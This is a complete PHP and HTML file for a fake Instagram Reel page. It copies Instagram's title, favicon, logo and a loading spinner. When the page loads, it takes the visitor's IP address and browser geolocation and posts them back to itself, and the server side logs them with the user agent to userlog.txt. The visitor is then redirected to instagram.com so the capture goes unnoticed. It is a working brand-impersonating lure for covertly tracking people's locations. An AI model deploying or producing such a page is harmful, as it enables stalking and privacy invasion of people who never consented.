<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ip']) && isset($_POST['lat']) && isset($_POST['lon'])) {
    $ip = $_POST['ip'];
    $lat = $_POST['lat'];
    $lon = $_POST['lon'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $time = date("Y-m-d H:i:s");

    $log = "[$time] IP: $ip | Latitude: $lat | Longitude: $lon | UA: $ua\n";
    file_put_contents("userlog.txt", $log, FILE_APPEND);

    echo "logged";
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="title" content="Instagram">
  <meta name="description" content="Loading Instagram Reel...">
  <title>Instagram Reel</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      text-align: center;
    }
    .logo {
      width: 80px;
      margin-bottom: 20px;
    }
    .spinner {
      border: 6px solid #eee;
      border-top: 6px solid #d6249f;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    h1 {
      font-size: 22px;
      color: #555;
    }
  </style>
</head>
<body>
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" class="logo" alt="Instagram Logo">
  <h1>Loading Instagram Reel...</h1>
  <div class="spinner"></div>

  <script>
    // Get visitor IP using backend
    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;

        // Get user's geolocation
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Send data to this PHP file
            fetch(window.location.href, {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded"
              },
              body: `ip=${ip}&lat=${lat}&lon=${lon}`
            }).then(() => {
              // Redirect after logging
              window.location.href = "https://instagram.com";
            });

          }, () => {
            // If location access is denied
            window.location.href = "https://instagram.com";
          });
        } else {
          window.location.href = "https://instagram.com";
        }
      });
  </script>
</body>
</html>
